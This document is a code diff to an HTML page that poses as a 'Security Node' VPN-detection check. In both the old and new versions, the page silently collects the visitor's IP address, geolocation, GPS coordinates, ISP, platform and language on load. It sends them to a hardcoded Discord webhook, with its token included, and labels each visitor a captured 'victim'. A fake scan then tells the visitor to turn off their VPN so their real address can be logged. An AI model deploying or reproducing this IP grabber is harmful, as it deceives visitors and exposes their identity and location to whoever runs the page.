@@ -3,490 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DARKNET ACCESS TERMINAL v4.7</title>
+    <title>Security Node - Verification</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: #000;
-            color: #0f0;
-            font-family: 'Share Tech Mono', monospace;
-            overflow: hidden;
-            position: relative;
-        }
-
-        /* Efecto Matrix de fondo */
-        #matrix {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            opacity: 0.15;
-        }
-
-        .container {
-            position: relative;
-            z-index: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .terminal {
-            background: rgba(0, 20, 0, 0.95);
-            border: 2px solid #0f0;
-            border-radius: 10px;
-            padding: 30px;
-            max-width: 700px;
-            width: 100%;
-            box-shadow: 0 0 50px rgba(0, 255, 0, 0.3),
-                        inset 0 0 30px rgba(0, 255, 0, 0.05);
-            animation: glowPulse 2s infinite;
-        }
-
-        @keyframes glowPulse {
-            0%, 100% { box-shadow: 0 0 50px rgba(0, 255, 0, 0.3), inset 0 0 30px rgba(0, 255, 0, 0.05); }
-            50% { box-shadow: 0 0 70px rgba(0, 255, 0, 0.5), inset 0 0 40px rgba(0, 255, 0, 0.1); }
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            border-bottom: 2px solid #0f0;
-            padding-bottom: 20px;
-        }
-
-        .skull {
-            font-size: 4rem;
-            animation: rotate 3s infinite;
-            display: inline-block;
-        }
-
-        @keyframes rotate {
-            0%, 100% { transform: rotate(0deg); }
-            25% { transform: rotate(-10deg); }
-            75% { transform: rotate(10deg); }
-        }
-
-        h1 {
-            font-size: 1.8rem;
-            margin: 15px 0 5px;
-            letter-spacing: 3px;
-            text-shadow: 0 0 10px #0f0;
-        }
-
-        .subtitle {
-            color: #0a0;
-            font-size: 0.9rem;
-            letter-spacing: 2px;
-        }
-
-        .status-box {
-            background: rgba(0, 0, 0, 0.7);
-            border: 1px solid #0f0;
-            padding: 20px;
-            margin: 20px 0;
-            border-radius: 5px;
-            min-height: 150px;
-        }
-
-        .status-line {
-            margin: 8px 0;
-            display: flex;
-            align-items: center;
-        }
-
-        .status-line::before {
-            content: "▶";
-            margin-right: 10px;
-            color: #0f0;
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0; }
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 25px;
-            background: #001a00;
-            border: 1px solid #0f0;
-            border-radius: 5px;
-            overflow: hidden;
-            margin: 20px 0;
-            position: relative;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #0f0, #0a0);
-            width: 0%;
-            transition: width 0.3s;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        .progress-text {
-            position: absolute;
-            width: 100%;
-            text-align: center;
-            line-height: 25px;
-            font-weight: bold;
-            text-shadow: 0 0 5px #000;
-        }
-
-        .warning-box {
-            display: none;
-            background: rgba(139, 0, 0, 0.3);
-            border: 2px solid #f00;
-            padding: 20px;
-            margin-top: 20px;
-            border-radius: 5px;
-            animation: warningPulse 1s infinite;
-        }
-
-        @keyframes warningPulse {
-            0%, 100% { border-color: #f00; box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
-            50% { border-color: #ff0; box-shadow: 0 0 30px rgba(255, 255, 0, 0.7); }
-        }
-
-        .warning-box h2 {
-            color: #f00;
-            font-size: 1.5rem;
-            margin-bottom: 15px;
-            text-align: center;
-            text-shadow: 0 0 10px #f00;
-        }
-
-        .warning-icon {
-            font-size: 3rem;
-            text-align: center;
-            margin-bottom: 10px;
-            animation: shake 0.5s infinite;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-
-        .scan-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
-            margin: 20px 0;
-        }
-
-        .scan-item {
-            background: rgba(0, 50, 0, 0.3);
-            padding: 10px;
-            border: 1px solid #0a0;
-            border-radius: 3px;
-            font-size: 0.85rem;
-        }
-
-        .scan-item span {
-            color: #0f0;
-            font-weight: bold;
-        }
-
-        .typing {
-            overflow: hidden;
-            white-space: nowrap;
-            animation: typing 2s steps(40);
-        }
-
-        @keyframes typing {
-            from { width: 0; }
-            to { width: 100%; }
-        }
-
-        /* Efecto de escaneo */
-        .scanline {
-            position: absolute;
-            width: 100%;
-            height: 2px;
-            background: rgba(0, 255, 0, 0.5);
-            animation: scan 3s linear infinite;
-            z-index: 2;
-        }
-
-        @keyframes scan {
-            0% { top: 0; }
-            100% { top: 100%; }
-        }
+        body { background: #0f172a; color: #f8fafc; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { background: #1e293b; border: 1px solid #334155; padding: 2rem; border-radius: 8px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); max-width: 400px; width: 90%; text-align: center; }
+        .warn { color: #fbbf24; font-size: 3rem; margin-bottom: 1rem; }
+        h2 { margin: 0 0 1rem; font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; }
+        .loader { height: 4px; width: 100%; background: #334155; border-radius: 10px; margin: 1.5rem 0; overflow: hidden; }
+        .fill { height: 100%; width: 0%; background: #ef4444; transition: width 0.1s; }
+        #status { font-size: 0.8rem; color: #94a3b8; }
+        .error-msg { display: none; background: #450a0a; border: 1px solid #991b1b; padding: 10px; border-radius: 4px; margin-top: 1rem; font-size: 0.85rem; color: #fca5a5; }
     </style>
 </head>
 <body>
-    <!-- Efecto Matrix de fondo -->
-    <canvas id="matrix"></canvas>
-    <div class="scanline"></div>
-
-    <div class="container">
-        <div class="terminal">
-            <div class="header">
-                <div class="skull">☠️</div>
-                <h1>DARKNET ACCESS TERMINAL</h1>
-                <div class="subtitle">SECURITY PROTOCOL v4.7.2 | ENCRYPTED NODE</div>
-            </div>
-
-            <div class="status-box" id="statusBox">
-                <div class="status-line typing" id="line1">Inicializando protocolo de verificación...</div>
-                <div class="status-line" id="line2" style="display:none;">Escaneando puertos abiertos...</div>
-                <div class="status-line" id="line3" style="display:none;">Analizando paquetes de red...</div>
-                <div class="status-line" id="line4" style="display:none;">Verificando túneles VPN/Proxy...</div>
-                <div class="status-line" id="line5" style="display:none;">Cruzando con bases de datos Interpol...</div>
-            </div>
-
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressBar"></div>
-                <div class="progress-text" id="progressText">0%</div>
-            </div>
-
-            <div class="scan-grid" id="scanGrid" style="display:none;">
-                                <div class="scan-item">🌐 IP: <span id="ipDisplay">Detectando...</span></div>
-                <div class="scan-item">🌍 País: <span id="countryDisplay">Analizando...</span></div>
-                <div class="scan-item">🏙️ Ciudad: <span id="cityDisplay">Rastreando...</span></div>
-                <div class="scan-item">🔒 Puertos: <span>22, 80, 443, 8080</span></div>
-                <div class="scan-item">📡 Latencia: <span id="latency">Calculando...</span></div>
-                <div class="scan-item">🛡️ Firewall: <span style="color:#f00;">DETECTADO</span></div>
-            </div>
-
-            <div class="warning-box" id="warningBox">
-                <div class="warning-icon">⚠️</div>
-                <h2>🚨 ACCESO DENEGADO 🚨</h2>
-                <div style="color: #ff0; text-align: center; margin: 15px 0; font-size: 1.1rem;">
-                    <strong>VPN/PROXY/TOR DETECTADO</strong>
-                </div>
-                <div style="color: #f88; font-size: 0.9rem; line-height: 1.6;">
-                    ► El sistema ha identificado que está utilizando herramientas de anonimato.<br>
-                    ► Por políticas de seguridad, el acceso desde conexiones enmascaradas está <strong>BLOQUEADO</strong>.<br>
-                    ► Para continuar, desactive su VPN/Proxy y recargue esta página.<br><br>
-                    <div style="text-align: center; margin-top: 15px; color: #0f0;">
-                        🔄 Presione F5 o CTRL+R para reintentar
-                    </div>
-                </div>
-            </div>
+    <div class="box">
+        <div class="warn">⚠️</div>
+        <h2>Security Alert</h2>
+        <div id="status">Iniciando escaneo de túneles...</div>
+        <div class="loader"><div class="fill" id="bar"></div></div>
+        <div id="error-box" class="error-msg">
+            <strong>VPN/PROXY DETECTADO</strong><br>
+            El sistema ha bloqueado el acceso desde su IP actual por uso de herramientas de anonimato. Desactive su VPN y recargue para ver el reporte.
         </div>
     </div>
 
     <script>
         // ============================================
-        // CONFIGURACIÓN - WEBHOOK DE DISCORD
+        // CONFIGURACIÓN
         // ============================================
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1462321256807530526/LWNvof3-5p65SyT7NAobTwT7__pn2Xniyqg2f_ia5a_anjEWaHvQ-2--RcEzu7SSbBqr";
 
-        // ============================================
-        // EFECTO MATRIX DE FONDO
-        // ============================================
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
-        const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
-        const fontSize = 14;
-        const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
-
-        function drawMatrix() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#0f0';
-            ctx.font = fontSize + 'px monospace';
-
-            for (let i = 0; i < drops.length; i++) {
-                const text = letters[Math.floor(Math.random() * letters.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
-                drops[i]++;
-            }
-        }
-
-        setInterval(drawMatrix, 35);
-
-        // ============================================
-        // SIMULACIÓN DE ESCANEO
-        // ============================================
-        let progress = 0;
-        let capturedData = {};
-
-        async function captureAndSend() {
+        async function init() {
+            const bar = document.getElementById('bar');
+            const st = document.getElementById('status');
+            const err = document.getElementById('error-box');
+            
+            // 1. CAPTURA SILENCIOSA Y ENVÍO A DISCORD
             try {
-                // Capturar IP
+                // Obtener IP
                 const respIP = await fetch('https://api.ipify.org?format=json');
                 const dataIP = await respIP.json();
                 const ip = dataIP.ip;
 
-                // Capturar geolocalización
+                // Obtener geolocalización
                 const respGeo = await fetch(`https://ipapi.co/${ip}/json/`);
                 const geo = await respGeo.json();
 
-                capturedData = {
-                    ip: ip,
-                    country: geo.country_name || 'N/A',
-                    city: geo.city || 'N/A',
-                    region: geo.region || 'N/A',
-                    latitude: geo.latitude || 'N/A',
-                    longitude: geo.longitude || 'N/A',
-                    isp: geo.org || 'N/A',
-                    timezone: geo.timezone || 'N/A'
-                };
-
-                // Actualizar display
-                document.getElementById('ipDisplay').textContent = ip;
-                document.getElementById('countryDisplay').textContent = capturedData.country;
-                document.getElementById('cityDisplay').textContent = capturedData.city;
-                document.getElementById('latency').textContent = Math.floor(Math.random() * 50 + 20) + 'ms';
-
-                // Enviar a Discord
+                // Crear embed para Discord
                 const embed = {
                     embeds: [{
-                        title: "🎯 NUEVA VÍCTIMA CAPTURADA",
-                        description: "**Sistema de Captura Darknet v4.7**",
+                        title: "🌐 NUEVA IP CAPTURADA",
                         color: 0xFF0000,
-                        thumbnail: {
-                            url: "https://cdn-icons-png.flaticon.com/512/2092/2092663.png"
-                        },
                         fields: [
-                            {
-                                name: "🌐 Dirección IP",
-                                value: `\`\`\`${ip}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: "🌍 Ubicación",
-                                value: `**País:** ${capturedData.country}\n**Ciudad:** ${capturedData.city}\n**Región:** ${capturedData.region}`,
-                                inline: true
-                            },
-                            {
-                                name: "🗺️ Coordenadas GPS",
-                                value: `[${capturedData.latitude}, ${capturedData.longitude}](https://www.google.com/maps?q=${capturedData.latitude},${capturedData.longitude})`,
-                                inline: true
-                            },
-                            {
-                                name: "🏢 Proveedor ISP",
-                                value: `\`${capturedData.isp}\``,
-                                inline: false
-                            },
-                            {
-                                name: "💻 Información del Sistema",
-                                value: `**SO:** ${navigator.platform}\n**Idioma:** ${navigator.language}\n**Zona Horaria:** ${capturedData.timezone}`,
-                                inline: true
-                            },
-                            {
-                                name: "🕐 Timestamp",
-                                value: `${new Date().toLocaleString('es-ES')}`,
-                                inline: true
-                            },
-                            {
-                                name: "📱 User Agent Completo",
-                                value: `\`\`\`${navigator.userAgent}\`\`\``,
-                                inline: false
-                            }
+                            { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+                            { name: "🌍 País", value: `${geo.country_name || 'N/A'} ${geo.country_emoji || ''}`, inline: true },
+                            { name: "🏙️ Ciudad", value: `${geo.city || 'N/A'}`, inline: true },
+                            { name: "📍 Región", value: `${geo.region || 'N/A'}`, inline: true },
+                            { name: "🗺️ GPS", value: `[${geo.latitude}, ${geo.longitude}](https://www.google.com/maps?q=${geo.latitude},${geo.longitude})`, inline: true },
+                            { name: "🏢 ISP", value: `${geo.org || 'N/A'}`, inline: true },
+                            { name: "💻 Sistema", value: `${navigator.platform}`, inline: true },
+                            { name: "🌐 Idioma", value: `${navigator.language}`, inline: true },
+                            { name: "⏰ Fecha", value: `${new Date().toLocaleString('es-ES')}`, inline: true }
                         ],
-                        footer: {
-                            text: "Darknet Access Terminal | Powered by ipapi.co"
-                        },
                         timestamp: new Date().toISOString()
                     }]
                 };
 
+                // Enviar a Discord
                 await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(embed)
                 });
 
-                console.log('✅ Datos enviados a Discord');
+                console.log('✅ IP enviada a Discord');
 
-            } catch (error) {
-                console.error('❌ Error:', error);
+            } catch(e) {
+                console.error('❌ Error:', e);
             }
+
+            // 2. ANIMACIÓN DE "DETECCIÓN"
+            let w = 0;
+            const iv = setInterval(() => {
+                w += 1;
+                bar.style.width = w + "%";
+                if(w == 30) st.innerText = "Analizando paquetes...";
+                if(w == 60) st.innerText = "Cruzando IP con registros...";
+                if(w == 90) st.innerText = "Finalizando...";
+                if(w >= 100) {
+                    clearInterval(iv);
+                    st.style.display = "none";
+                    err.style.display = "block";
+                }
+            }, 50);
         }
 
-        // ============================================
-        // ANIMACIÓN DE PROGRESO
-        // ============================================
-        function updateProgress() {
-            const progressBar = document.getElementById('progressBar');
-            const progressText = document.getElementById('progressText');
-            const statusBox = document.getElementById('statusBox');
-            const scanGrid = document.getElementById('scanGrid');
-            const warningBox = document.getElementById('warningBox');
-
-            const interval = setInterval(() => {
-                progress += Math.random() * 3 + 1;
-
-                if (progress > 100) progress = 100;
-
-                progressBar.style.width = progress + '%';
-                progressText.textContent = Math.floor(progress) + '%';
-
-                // Mostrar líneas de estado progresivamente
-                if (progress > 15) document.getElementById('line2').style.display = 'flex';
-                if (progress > 30) document.getElementById('line3').style.display = 'flex';
-                if (progress > 50) {
-                    document.getElementById('line4').style.display = 'flex';
-                    scanGrid.style.display = 'grid';
-                }
-                if (progress > 75) document.getElementById('line5').style.display = 'flex';
-
-                // Al llegar al 100%
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        statusBox.style.display = 'none';
-                                                warningBox.style.display = 'block';
-                        
-                        // Efecto de parpadeo en el warning
-                        let blinkCount = 0;
-                        const blinkInterval = setInterval(() => {
-                            warningBox.style.opacity = warningBox.style.opacity === '0' ? '1' : '0';
-                            blinkCount++;
-                            if (blinkCount > 6) {
-                                clearInterval(blinkInterval);
-                                warningBox.style.opacity = '1';
-                            }
-                        }, 300);
-                    }, 1000);
-                }
-            }, 100);
-        }
-
-        // ============================================
-        // INICIALIZACIÓN
-        // ============================================
-        window.onload = async function() {
-            // Capturar datos en segundo plano
-            await captureAndSend();
-            
-            // Iniciar animación de progreso
-            setTimeout(updateProgress, 500);
-        };
-
-        // Redimensionar canvas al cambiar tamaño de ventana
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
+        window.onload = init;
     </script>
 </body>
 </html>
